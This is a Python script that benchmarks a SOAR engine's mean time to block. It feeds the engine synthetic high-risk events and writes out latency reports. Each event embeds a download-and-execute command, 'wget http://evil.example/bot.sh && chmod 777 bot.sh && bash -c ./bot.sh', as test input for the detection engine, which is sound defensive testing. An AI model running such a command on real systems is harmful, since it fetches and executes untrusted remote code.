#!/usr/bin/env python3
"""Measure SOAR mean time to block using controlled high-risk events."""

from __future__ import annotations

import argparse
import asyncio
import json
import statistics
import time
from pathlib import Path
from typing import Any

from .soar import SOAREngine


async def run_benchmark(args: argparse.Namespace) -> dict[str, Any]:
    allowlist = [part.strip() for part in args.allowlist.split(",") if part.strip()]
    class MockSettings:
        pass
    redis_settings = None
    if args.redis_url:
        redis_settings = MockSettings()
        redis_settings.url = args.redis_url

    engine = SOAREngine(
        risk_threshold=args.risk_threshold,
        firewall_enabled=True,
        firewall_dry_run=not args.active,
        firewall_path=args.firewall_path,
        block_ttl=args.block_ttl,
        allowlist=allowlist,
        active_profile="do" if args.active else "local",
        mttb_target_ms=args.target_ms,
        redis_settings=redis_settings,
    )
    await engine.start()
    
    samples: list[dict[str, Any]] = []
    for index in range(args.iterations):
        event = {
            "eventid": "cloudsentinel.command.input",
            "session": f"mttb_{index}",
            "src_ip": args.source_ip,
            "country_code": "RU",
            "input": "wget http://evil.example/bot.sh && chmod 777 bot.sh && bash -c ./bot.sh",
            "detected_at": time.time(),
        }
        result = await engine.process_event(event["session"], event)
        samples.append(result)
        await asyncio.sleep(args.delay)

    await engine.stop()

    values = [float(sample.get("mttb_ms", 0.0)) for sample in samples if "mttb_ms" in sample]
    report = {
        "active": args.active,
        "source_ip": args.source_ip,
        "iterations": args.iterations,
        "target_ms": args.target_ms,
        "median_ms": round(statistics.median(values), 3) if values else 0.0,
        "p95_ms": round(sorted(values)[min(len(values) - 1, int(len(values) * 0.95))], 3) if values else 0.0,
        "actions": [sample.get("cloudsentinel_soar_action") for sample in samples],
        "pass": bool(values) and statistics.median(values) <= args.target_ms,
        "samples": samples,
    }
    return report


def write_artifacts(report: dict[str, Any], artifacts_dir: Path) -> None:
    artifacts_dir.mkdir(parents=True, exist_ok=True)
    (artifacts_dir / "mttb-benchmark.json").write_text(
        json.dumps(report, indent=2, sort_keys=True),
        encoding="utf-8",
    )
    lines = [
        "# CloudSentinel MTTB Benchmark",
        "",
        f"- Mode: {'active iptables' if report['active'] else 'dry-run'}",
        f"- Source IP: {report['source_ip']}",
        f"- Iterations: {report['iterations']}",
        f"- Median MTTB: {report['median_ms']} ms",
        f"- p95 MTTB: {report['p95_ms']} ms",
        f"- Target: {report['target_ms']} ms",
        f"- Result: {'PASS' if report['pass'] else 'FAIL'}",
    ]
    (artifacts_dir / "mttb-benchmark.md").write_text("\n".join(lines) + "\n", encoding="utf-8")


async def main() -> None:
    parser = argparse.ArgumentParser(description="Benchmark CloudSentinel SOAR MTTB")
    parser.add_argument("--active", action="store_true", help="Use real firewall command")
    parser.add_argument("--source-ip", default="8.8.8.8")
    parser.add_argument("--iterations", type=int, default=5)
    parser.add_argument("--delay", type=float, default=0.05)
    parser.add_argument("--risk-threshold", type=int, default=30)
    parser.add_argument("--target-ms", type=int, default=100)
    parser.add_argument("--block-ttl", type=int, default=60)
    parser.add_argument("--firewall-path", default="/sbin/iptables")
    parser.add_argument("--redis-url", default="redis://localhost:6379/0", help="Redis URL for stateless testing")
    parser.add_argument(
        "--allowlist",
        default="127.0.0.1,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,169.254.169.254",
    )
    parser.add_argument("--artifacts-dir", default="artifacts")
    args = parser.parse_args()
    report = await run_benchmark(args)
    write_artifacts(report, Path(args.artifacts_dir))
    print(json.dumps(report, indent=2, sort_keys=True))


if __name__ == "__main__":
    asyncio.run(main())
